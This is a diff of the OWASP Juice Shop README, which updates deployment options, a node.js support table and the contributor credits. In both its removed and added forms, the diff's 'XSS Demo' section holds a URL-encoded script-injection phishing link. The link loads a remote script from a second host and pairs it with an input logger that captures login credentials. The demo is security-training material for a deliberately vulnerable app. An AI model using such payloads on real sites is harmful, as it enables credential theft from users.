@@ -91,6 +91,15 @@ overview please visit the official project page:
 3. Click on the _Open_ icon next to _Web Preview_ to browse to OWASP
    Juice Shop
 
+#### Deploy to Docker Cloud (:microscope:)
+
+1. Click the button below and follow the instructions
+
+[![Deploy to Docker Cloud](https://files.cloud.docker.com/images/deploy-to-dockercloud.svg)](https://cloud.docker.com/stack/deploy/)
+
+> This (:microscope:) is an experimental deployment option! Your
+> feedback is appreciated at <https://gitter.im/bkimminich/juice-shop>.
+
 ### Vagrant
 
 1. Install [Vagrant](https://www.vagrantup.com/downloads.html) and
@@ -100,18 +109,6 @@ overview please visit the official project page:
    of the repository)
 3. Run `cd vagrant && vagrant up`
 4. Browse to [192.168.33.10](http://192.168.33.10)
-
-> To show the possible impact of
-> [XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)),
-> assume you received and (of course) clicked
-> [this inconspicuous phishing link](http://192.168.33.10/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2F192.168.33.10%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
-> and login. Apart from the visual/audible effect, the attacker also
-> installed [an input logger](http://192.168.33.10/logger.php) to grab
-> credentials! This could easily run on a 3rd party server in real life!
->
-> _This feature is only available when running a Vagrant box. A
-> recording of the effect is available on Youtube:_
-> [:tv:](https://www.youtube.com/watch?v=L7ZEMWRm7LA)
 
 ### Amazon EC2 Instance
 
@@ -165,10 +162,10 @@ OWASP Juice Shop officially supports the following versions of
 official [node.js LTS schedule](https://github.com/nodejs/LTS). Docker
 images and packaged distributions are offered accordingly:
 
-| node.js             | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)         |
-|:--------------------|:------------------------------------------------------------------------------------|:-------------------------------------------------------------------------------------------|
-| __9.x__             | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz`   |
-| 8.x                 |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz`   |
+| node.js | [Docker image](https://registry.hub.docker.com/u/bkimminich/juice-shop)             | [Packaged distributions](https://github.com/bkimminich/juice-shop/releases/latest)       |
+|:--------|:------------------------------------------------------------------------------------|:-----------------------------------------------------------------------------------------|
+| __9.x__ | __`latest`__ (current official release), `snapshot` (preview from `develop` branch) | `juice-shop-<version>_node9_windows_x64.zip`, `juice-shop-<version>_node9_linux_x64.tgz` |
+| 8.x     |                                                                                     | `juice-shop-<version>_node8_windows_x64.zip`, `juice-shop-<version>_node8_linux_x64.tgz` |
 
 ## Demo [![Heroku](https://heroku-badge.herokuapp.com/?app=juice-shop)](http://demo.owasp-juice.shop)
 
@@ -198,6 +195,20 @@ tool.
 For step-by-step instructions and examples please refer to
 [the _Hosting a CTF event_ chapter](https://bkimminich.gitbooks.io/pwning-owasp-juice-shop/content/part1/ctf.html)
 of our companion guide ebook.
+
+## XSS Demo
+
+To show the possible impact of
+[XSS](https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)), you
+can download this
+[docker-compose](https://raw.githubusercontent.com/wurstbrot/shake-logger/master/docker-compose.yml)-file
+and run `docker-compose up` to start the juice-shop and the
+shake-logger. Assume you received and (of course) clicked
+[this inconspicuous phishing link](http://localhost:3000/#/search?q=%3Cscript%3Evar%20js%20%3Ddocument.createElement%28%22script%22%29;js.type%20%3D%20%22text%2Fjavascript%22;js.src%3D%22http:%2F%2Flocalhost:8080%2Fshake.js%22;document.body.appendChild%28js%29;varhash%3Dwindow.location.hash;window.location.hash%3Dhash.substr%280,8%29;%3C%2Fscript%3Eapple)
+and login. Apart from the visual/audible effect, the attacker also
+installed [an input logger](http://localhost:8080/logger.php) to grab
+credentials! This could easily run on a 3rd party server in real life!
+
 
 ## Additional Documentation
 
@@ -302,97 +313,15 @@ guide for help with filling out the donation form correctly.
 
 ## Contributors
 
-### Collaborators
+The OWASP Juice Shop core project team are:
 
 - [Björn Kimminich](https://github.com/bkimminich) aka `bkimminich`
   ([Project Leader](https://www.owasp.org/index.php/Projects/Project_Leader_Responsibilities))
 - [Jannik Hollenbach](https://github.com/J12934) aka `J12934`
 - [Timo Pagel](https://github.com/wurstbrot) aka `wurstbrot`
 
-### GitHub Contributors
-
-Based on [GitHub](https://github.com/bkimminich/juice-shop) commits on
-`master` as of Wed, 15 Mar 2018
-
-- [m4l1c3](https://github.com/m4l1c3) aka `m4l1c3`
-- [Shoeb Patel](https://github.com/CaptainFreak) aka `CaptainFreak`
-- [Josh Grossman](https://github.com/tghosth) aka `tghosth`
-- [Madhur Wadhwa](https://github.com/madhurw7) aka `madhurw7`
-- [Omer Levi Hevroni](https://github.com/omerlh) aka `omerlh`
-- [Jln Wntr](https://github.com/JlnWntr) aka `JlnWntr`
-- [Aashish Singh](https://github.com/Aashish683) aka `Aashish683`
-- [Greg Guthe](https://github.com/g-k) aka `g-k`
-- [Viktor Lindström](https://github.com/ViktorLindstrm) aka
-  `ViktorLindstrm`
-- [Ingo Bente](https://github.com/ingben) aka `ingben`
-- [Aaron Edwards](https://github.com/aaron-m-edwards) aka
-  `aaron-m-edwards`
-- [Yuvraj](https://github.com/evalsocket) aka `evalsocket`
-- [Gorka Vicente](https://github.com/gorkavicente) aka `gorkavicente`
-- [Dinis Cruz](https://github.com/DinisCruz) aka `DinisCruz`
-- [Jason Haley](https://github.com/JasonHaley) aka `JasonHaley`
-- [Simon Basset](https://github.com/simbas) aka `simbas`
-- [Ken Friis Larsen](https://github.com/kfl) aka `kfl`
-- [Simon De Lang](https://github.com/simondel) aka `simondel`
-- [battletux](https://github.com/battletux) aka `battletux`
-- [AviD](https://github.com/avidouglen) aka `avidouglen`
-- [Achim Grimm](https://github.com/achimgrimm) aka `achimgrimm`
-- [Christian Kühn](https://github.com/cy4n) aka `cy4n`
-- [Stuart Winter-Tear](https://github.com/StuartWinterTear) aka
-  `StuartWinterTear`
-- [Manabu Niseki](https://github.com/ninoseki) aka `ninoseki`
-- [Abhishek bundela](https://github.com/abhishekbundela) aka
-  `abhishekbundela`
-- [Joe Butler](https://github.com/incognitjoe) aka `incognitjoe`
-- [Stephen O'Brien](https://github.com/wayofthepie) aka `wayofthepie`
-- [Johanna](https://github.com/johanna-a) aka `johanna-a`
-- [Alvaro Viebrantz](https://github.com/alvarowolfx) aka `alvarowolfx`
-
-### Translators
-
-Based on [CrowdIn](https://crowdin.com/project/owasp-juice-shop)
-translations and commits to `app/i18n`. Grouped by language as of Fri,
-13 Apr 2018 on `develop`.
-
-- :brazil: sergio.kubota
-- :cn: Coink, rToxic
-- :czech_republic: Martin Hartl, stejkenzie
-- :denmark: Allan Kimmer Jensen, owangen, Rasmus Bidstrup
-- :estonia: bmoritz, janesmae, Egert Aia, spruur, rakzcs
-- :finland: Nico Ådahl
-- :fr: Kylian Runembert, vientspam, Simon Basset
-- :de: Björn Kimminich
-- :hongkong: r0n1am
-- :hungary: OliverkeHU
-- :india: Shivam Luthra
-- :indonesia: adeyosemanputra, bahrunghozali, kahfiehudson, Mohammad
-  Febri Ramadlan, Rick Daalhuizen, Syahrol
-- :israel: AviD, Omer Levi Hevroni
-- :it: vientspam
-- :jp: ninoseki, nilfigo
-- :myanmar: thinbashane
-- :netherlands: Bart Decker, Daan Sprenkels, Manu B, rachidbm,
-  vientspam, Wout Huygens, Rick Daalhuizen
-- :norway: owangen
-- :poland: Idomin Ninja, Andrew Pio
-- :portugal: Alvaro Viebrantz
-- :romania: Mircea Ulmeanu, orjen, timexlord
-- :ru: fieldhill13
-- :es: alopezhu, CarlCampbell, Carlos Allendes, Ezequiel Andino,
-  mateomartinez, soledad aro, Gorka Vicente
-- :sweden: Anders Lindberg, atteism, cello-anders, Klas Fahlberg,
-  landinl, Mattias Persson, Pär Swedberg
-- :tr: Ender Çulha
-
-### Special Thanks
-
-* Inspired by the "classic"
-  [BodgeIt Store](https://github.com/psiinon/bodgeit) by
-  [@psiinon](https://github.com/psiinon)
-* Revised OWASP Juice Shop and Juice Shop CTF logo artworks by Emily
-  Gundry (courtesy of [@SecureState](https://github.com/SecureState))
-* [Pwning OWASP Juice Shop](https://leanpub.com/juice-shop) cover
-  artwork by [Patch Kroll](https://99designs.de/profiles/3099878)
+For a list of all contributors to the OWASP Juice Shop please visit our
+[HALL_OF_FAME.md](HALL_OF_FAME.md).
 
 ## Licensing [![license](https://img.shields.io/github/license/bkimminich/juice-shop.svg)](LICENSE)
 
@@ -400,4 +329,4 @@ This program is free software: you can redistribute it and/or modify it
 under the terms of the [MIT license](LICENSE). OWASP Juice Shop and any
 contributions are Copyright © by Bjoern Kimminich 2014-2018.
 
-![Juice Shop Logo](https://raw.githubusercontent.com/bkimminich/juice-shop/master/app/public/images/JuiceShop_Logo.png)
+![Juice Shop Logo](https://raw.githubusercontent.com/bkimminich/juice-shop/develop/app/public/images/JuiceShop_Logo_400px.png)
